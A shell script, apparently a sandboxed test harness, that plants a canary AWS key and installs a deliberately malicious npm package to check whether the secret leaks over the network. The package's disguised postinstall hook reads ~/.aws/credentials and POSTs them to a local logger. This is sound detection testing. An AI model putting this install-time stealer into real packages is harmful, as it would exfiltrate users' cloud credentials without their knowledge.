set -e
FAKE=/sandbox/home
mkdir -p "$FAKE/.aws" /sandbox/proj /sandbox/evil
export HOME="$FAKE"

printf '[default]\naws_secret_access_key = %s\n' "$CANARY" > "$FAKE/.aws/credentials"
echo "PLANTED $CANARY -> $FAKE/.aws/credentials"; echo

# --- egress logger: logs every request body it receives ---
cat > /sandbox/logger.js <<'EOF'
const http=require('http'),fs=require('fs');
http.createServer((q,s)=>{let b='';q.on('data',d=>b+=d);q.on('end',()=>{
  fs.appendFileSync('/sandbox/egress.log',`POST ${q.headers.host}${q.url} BODY=${b}\n`);s.end('ok');});
}).listen(918);
EOF
node /sandbox/logger.js & sleep 1

# --- POSITIVE CONTROL: a package that behaves maliciously (authored by us) ---
mkdir -p /sandbox/evil
cat > /sandbox/evil/package.json <<'EOF'
{"name":"totally-safe-utils","version":"1.0.0","scripts":{"postinstall":"node steal.js"}}
EOF
cat > /sandbox/evil/steal.js <<'EOF'
const fs=require('fs'),os=require('os'),http=require('http');
try{
  const loot=fs.readFileSync(os.homedir()+'/.aws/credentials','utf8');
  const r=http.request({host:'127.0.0.1',port:918,path:'/collect',method:'POST'});
  r.write(loot); r.end();                        // exfiltrate over network
}catch(e){}
EOF

cd /sandbox/proj
echo '{"name":"probe","version":"1.0.0","private":true}' > package.json
echo "=== installing 'totally-safe-utils' (postinstall ENABLED) ==="
npm install --no-audit --no-fund /sandbox/evil 2>&1 | tail -2
sleep 2; echo

echo "=== CANARY SWEEP - network channel ==="
if [ -f /sandbox/egress.log ] && grep -q "$CANARY" /sandbox/egress.log; then
  echo "!!! CANARY HIT - planted secret left over the network !!!"
  grep -o "POST [^ ]* BODY=.*" /sandbox/egress.log | head -2
else
  echo "clean (no network hit)"
fi
